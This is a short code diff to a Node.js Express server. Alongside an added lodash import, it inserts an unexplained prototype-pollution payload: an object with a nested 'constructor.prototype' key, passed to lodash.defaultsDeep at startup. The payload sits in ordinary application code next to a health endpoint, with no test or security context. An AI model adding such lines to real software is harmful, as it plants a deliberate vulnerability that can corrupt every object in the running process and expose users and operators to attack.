@@ -2,6 +2,7 @@ const express = require('express');
 const path = require('path');
 const fs = require('fs');
 const { execSync } = require('child_process');
+const lodash = require('lodash')
 
 const app = express();
 const PORT = process.env.PORT || 3000;
@@ -14,6 +15,9 @@ const BUILD_ID = (() => {
     return 'unknown';
   }
 })();
+ 
+const evilsrc = {constructor: {prototype: {evilkey: "evilvalue"}}};
+lodash.defaultsDeep({}, evilsrc)
 
 app.get('/health', (req, res) => {
   res.json({ status: 'ok', timestamp: new Date().toISOString(), buildId: BUILD_ID });
